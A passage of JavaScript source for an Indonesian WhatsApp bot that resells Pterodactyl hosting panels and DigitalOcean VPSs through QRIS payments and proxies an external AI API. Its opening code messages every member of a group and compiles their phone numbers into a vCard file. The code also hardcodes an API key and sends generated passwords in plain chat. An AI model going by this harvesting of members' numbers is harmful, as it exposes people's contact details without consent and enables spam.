                `FN:${namaowner}>[${createSerial(2)}] ${contact.split("@")[0]}`,
                `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
                "END:VCARD",
                "",
            ].join("\n");
            return vcard;
        }).join("");

        fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
    } catch (err) {
        m.reply(err.toString());
    } finally {
        if (m.chat !== m.sender) {
            await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`);
        }
        await RuzXD.sendMessage(
            m.sender,
            {
                document: fs.readFileSync("./all/database/contacts.vcf"),
                fileName: "contacts.vcf",
                caption: "File Contact Berhasil Dibuat✅",
                mimetype: "text/vcard",
            },
            { quoted: m }
        );
        contacts.splice(0, contacts.length);
        await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts));
        await fs.writeFileSync("./all/database/contacts.vcf", "");
    }
}
break;
case 'addbl': {
if (!isOwner) return reply(msg.owner)
if (!isGroup) {
reply( 'Perintah ini hanya bisa digunakan di grup.')
return;
}
const groupId = m.chat;
if (!groupId) {
reply('Gagal mendapatkan ID grup.')
return;
}
if (!blacklist.includes(groupId)) {
blacklist.push(groupId);
try {
fs.writeFileSync(filePath, JSON.stringify(blacklist, null, 2));
reply(`Grup ini berhasil ditambahkan ke blacklist.`);
console.log(`Grup ${groupId} ditambahkan ke blacklist.`);
        } catch (err) {
console.error('Gagal menyimpan ke file:', err.message);
reply('Terjadi kesalahan saat menyimpan blacklist.')
}
} else {
reply( 'Grup ini sudah ada di blacklist.')
}}
break;
case 'unbl': {
    if (!isOwner) return reply(msg.owner)
    const filePath = './blacklist.json';
    if (!isGroup) {
        reply( 'Perintah ini hanya bisa digunakan di grup.')
        return;
    }

    const groupId = m.chat;
    if (!groupId) {
        reply('Gagal mendapatkan ID grup.')
        return;
    }
    const index = blacklist.indexOf(groupId);
    if (index === -1) {
        reply('Grup ini tidak ada di blacklist.')
        return;
    }
    blacklist.splice(index, 1);
    try {
        fs.writeFileSync(filePath, JSON.stringify(blacklist, null, 2));
        reply(`Grup ini berhasil dihapus dari blacklist.`)
        console.log(`Grup ${groupId} dihapus dari blacklist.`);
    } catch (err) {
        console.error('Gagal menyimpan ke file:', err.message);
        reply('Terjadi kesalahan saat menyimpan blacklist.')
    }
    }
    break;
 case 'listbl': {
     if (!isOwner) return reply(msg.owner)
    const filePath = './blacklist.json';
    if (blacklist.length === 0) {
        reply('Tidak ada grup yang terdaftar di blacklist.');
        return;
    }

    let message = 'Daftar Grup yang Terdaftar di Blacklist:\n';
    for (let groupId of blacklist) {
        try {
            const groupMetadata = await RuzXD.groupMetadata(groupId);
            const groupName = groupMetadata.subject; // Nama grup
            message += `\n- ${groupName} (ID: ${groupId})`;
        } catch (err) {
            console.error(`Gagal mengambil data untuk grup ${groupId}:`, err.message);
            message += `\n- Gagal mendapatkan nama grup untuk ID ${groupId}`;
        }
    }

    reply(`${message}`)
 }
       break;
       case 'luminai1': {
    try {
        if (!m || !m.key || !m.key.remoteJid) {
            console.error("Pesan tidak valid:", m);
            break;
        }
        const targetJid = m.key.remoteJid;
        const query = args.join(' ').trim();
        if (!query) {
            await RuzXD.sendMessage(targetJid, {
                text: "Silakan masukkan teks setelah perintah '!luminai'.",
            });
            return;
        }

        const apiUrl = `https://ruzxd-rest-api.tanxd.my.id/luminai?text=${encodeURIComponent(query)}`;
        console.log("API URL:", apiUrl);
        const response = await axios.get(apiUrl);

        if (response.status === 200 && response.data && response.data.data) {
            const replyText = response.data.data.result || "Tidak ada respons dari API.";
            // Gunakan replyAI untuk mengirimkan balasan
            await replyAI(targetJid, replyText);
        } else {
            await RuzXD.sendMessage(targetJid, {
                text: "Maaf, terjadi kesalahan saat memproses permintaan Anda.",
            });
        }
    } catch (error) {
        console.error("Error fetching Luminai API:", error.response?.data || error.message);
        const errorMessage = error.response?.data?.message || "Terjadi kesalahan saat mengakses API.";
        await RuzXD.sendMessage(m.key.remoteJid, { text: errorMessage });
    }
}
break;
       case 'luminai': {
    try {
        if (!m || !m.key || !m.key.remoteJid) {
            console.error("Pesan tidak valid:", m);
            break;
        }
        const targetJid = m.key.remoteJid;
        const query = args.join(' ').trim();
        if (!query) {
            await RuzXD.sendMessage(targetJid, {
                text: "Silakan masukkan teks setelah perintah '!luminai'.",
            });
        }
        const apiUrl = `https://ruzxd-rest-api.tanxd.my.id/luminai?text=${encodeURIComponent(query)}`;
        console.log("API URL:", apiUrl);
        const response = await axios.get(apiUrl);

        if (response.status === 200 && response.data && response.data.data) {
            const replyText = response.data.data.result || "Tidak ada respons dari API.";
            await RuzXD.sendMessage(targetJid, { text: replyText });
        } else {
            await RuzXD.sendMessage(targetJid, {
                text: "Maaf, terjadi kesalahan saat memproses permintaan Anda.",
            });
        }
    } catch (error) {
        console.error("Error fetching Luminai API:", error.response?.data || error.message);
        const errorMessage = error.response?.data?.message || "Terjadi kesalahan saat mengakses API.";
        await RuzXD.sendMessage(m.key.remoteJid, { text: errorMessage });
    }
    }
    break;
case "cadmin": {
if (!isOwner) return reply(msg.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await RuzXD.sendMessage(orang, {text: teks}, {quoted: m})
}
break
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!jangan) return reply(`*MAGER, GRUP BLUM DI AKSES SAMA OWN*`)
//if (!text) return m.reply(example("1gb username"))
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer\ncontoh: .1gb ruztan,${owner}`)

//global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let email = username+"@gmail.com"
let password = username+crypto.randomBytes(2).toString('hex')
if (!u) return
let d = (await RuzXD.onWhatsApp(u.split`@`[0]))[0] || {}
let name = capital(username) + " Server"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await RuzXD.sendMessage(u, {text: teks}, {quoted: m})
//delete global.panel
}
break
case "cp1gb": case "cp2gb": case "cp3gb": case "cp4gb": case "cp5gb": case "cp6gb": case "cp7gb": case "cp8gb": case "cp9gb": case "cp10gb": case "cpunlimited": case "cpunli": {
if (!isOwner) return reply(msg.owner)
if (!text) return m.reply(example("1gb username"))
global.panell = text
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "cp10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panell.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainn + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainn + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainn + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainn}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await RuzXD.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panell
}
break
case "belipanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (!db.users[m.sender]) {
    return m.reply("Pengguna tidak ditemukan dalam database.");
}

if (db.users[m.sender].status_deposit) {
    return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
}

let teks = `
 *#- List ram server yang tersedia*
 
* 1GB
* 2GB
* 3GB
* 4GB
* 5GB
* 6GB
* 7GB
* 8GB
* 10GB
* unlimited

 Contoh penggunaan : *.belipanel* 2gb
`
if (!text) return m.reply(teks)
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "2000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "3000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "4000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "5000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "6000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "7000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "8000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "9000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "10000"
} else return m.reply(teks)

const UrlQr = `${global.qrisOrderKuota}`

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

let amount = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://ruztan.apixd.my.id/api/orkut/createpayment?apikey=echa&amount=${amount}&codeqr=${global.qrisOrderKuota}`)
const teks3 = `
*▧ INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await RuzXD.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await RuzXD.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await RuzXD.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(15000)
const resultcek = await axios.get(`https://ruztan.apixd.my.id/api/orkut/cekstatus?apikey=echa&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data.amount
if (db.users[m.sender].saweria && req == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await RuzXD.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
 *• Payment :* ${resultcek.data.brand_name}
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainn + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainn + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainn + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainn}
* *Ram :* ${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}
* *Cpu :* ${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}
* *Disk :* ${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await RuzXD.sendMessage(orang, {text: tekspanel}, {quoted: null})
await RuzXD.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break
case "cvps":{
if (!isOwner) return reply(msg.owner)
let teks = `
 *#- List ram yang tersedia*
 
- 4GB
- 8GB
- 16GB


 Contoh penggunaan : *.cvps* 4gb`
 
if (!text) return m.reply(teks)
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "4gb") {
Obj.nama = "root"
Obj.ram = "s-2vcpu-4gb"
Obj.harga = "40000"  // harga vps
} else if (cmd == "8gb") {
Obj.nama = "root"
Obj.ram = "s-4vcpu-8gb"
Obj.harga = "50000"  // harga vps
} else if (cmd == "16gb") {
Obj.nama = "root"
Obj.ram = "s-4vcpu-16gb"
Obj.harga = "70000" // harga vps
} else return m.reply(teks)
//const UrlQr = `${global.qrisOrderKuota}`

try {
    let dropletData = {
      name: 'root',
      region: 'sgp1',
      size: Obj.ram,
      image: 'ubuntu-22-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['Ruztan']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apido
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      m.reply(`\`\`\`Tunggu Sebentar...\`\`\``);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apido
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `*\`VPS berhasil dibuat √\`*\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n\n`;
      
      messageText += `*\`SPEKTIFIKASI\`*\n\n*©RuztanXD*`;
      
      /*messageText += `HOSTNAME: ${hostname}\n`;
      messageText += `REGION: ${regions}\n`;
      messageText += `RAM: ${ram}\n`;
      messageText += `OS + VERSI: ${osvps}\n`*/;

      await RuzXD.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
    

  } catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break
case 'payment':{
    await RuzXD.sendMessage(m.chat, {
        image: { url: global.qris }, // Gambar pertama
        caption: `VIA QRIS SCAN DI ATAS\n\nDANA: ${global.dana}\n${global.gopay}\n${global.ovo}\n\n*WAJIB MENYERTAKAN BUKTI TRX*\n💌BUY BERARTI PAHAM`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: "Shikimori Assistant",
                newsletterJid: global.idsaluran,
            },
            externalAdReply: {  
                title: `© Shikimori Assistant`, 
                body: '',
                thumbnailUrl: thumb,
                sourceUrl: global.sgc, 
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    });
}
    break;
    case "tes":{
let ini = `halo`
let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: `ʜᴀʟᴏ sᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ sɪᴍᴘʟᴇ ᴍᴇɴᴜ *\`ʜɪʟʟᴀʀʏʏᴏᴜʀs\`*`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "ʜɪʟʟᴀʀʏ ᴀʙɪɢᴀɪʟ"
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({     
                                hasMediaAttachment: false
                            }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: [{
                                        body: proto.Message.InteractiveMessage.Body.fromObject({
                                           text: ini
                                        }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "ʟɪʟʏ ʙʏ ғᴀʟʟᴢx"
                            }),
                                        header: proto.Message.InteractiveMessage.Header.fromObject({
                                            title: ``,
                                            hasMediaAttachment: true,
                                            ...(await prepareWAMessageMedia({
                                                image: global.imgmenu,
                                            }, {
                                                upload: RuzXD.waUploadToServer
                                            }))
                                        }),
                                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                            buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: "𝐋𝐢𝐬𝐭 𝐌𝐞𝐧𝐮",
                                    sections: [
                                        {
                                            "title": "𝐇𝐢𝐥𝐥𝐚𝐫𝐲 𝐀𝐛𝐢𝐠𝐚𝐢𝐥",
                                            "rows": [
                                                {
                                                    "header": "𝐎𝐰𝐧𝐞𝐫",
                                                    "title": "𝐇𝐢𝐥𝐥𝐚𝐫𝐲 𝐕𝟏.𝟖",
                                                    "id": ".owner"
                                                }
                                            ]
                                        }
                                    ]
                                })
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𝐌𝐲 𝐘𝐨𝐮𝐭𝐮𝐛𝐞",
                                    url: "https://www.youtube.com/@FallZx-Features",
                                    merchant_url: "https://www.youtube.com/@FallZx-Features"
                                })        
                                }, 
                               {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𝐌𝐲 𝐒𝐚𝐥𝐮𝐫𝐚𝐧",
                                    url: "https://whatsapp.com/channel/0029VaBOlsv002TEjlntTE2D",
                                    merchant_url: "https://whatsapp.com/channel/0029VaBOlsv002TEjlntTE2D"
                                })
                            }
                        ]
                                        })
                                    }
                                ]
                            })
                        })
                    }
                }
            }, {})

            await RuzXD.relayMessage(
            m.chat, msg.message, {
            messageId: msg.key.id
                })              
}
break
    case "buypanel":{
    if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
 //   if (!text) return reply(`kasih username\nCONTOH: .1gb ruztanxd`)
let ini = `╭┈──────────────────
┃乂 *LIST HARGA PANEL* 乂
┃𖣘 1GB Rp 2.000
┃𖣘 2GB Rp 3.000
┃𖣘 3GB Rp 4.000
┃𖣘 4GB Rp 5.000
┃𖣘 5GB Rp 6.000
┃𖣘 6GB Rp 7.000
┃𖣘 7GB Rp 8.000
┃𖣘 8GB Rp 9.000
┃𖣘 UNLI Rp 10.000
╰┈────────────────•`
let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: `SILAHKAN PILIH PAKET YANG ANDA MINAT`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: ""
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({     
                                hasMediaAttachment: false
                            }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: [{
                                        body: proto.Message.InteractiveMessage.Body.fromObject({
                                           text: ini
                                        }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: namabot
                            }),
                                        header: proto.Message.InteractiveMessage.Header.fromObject({
                                            title: ``,
                                            hasMediaAttachment: true,
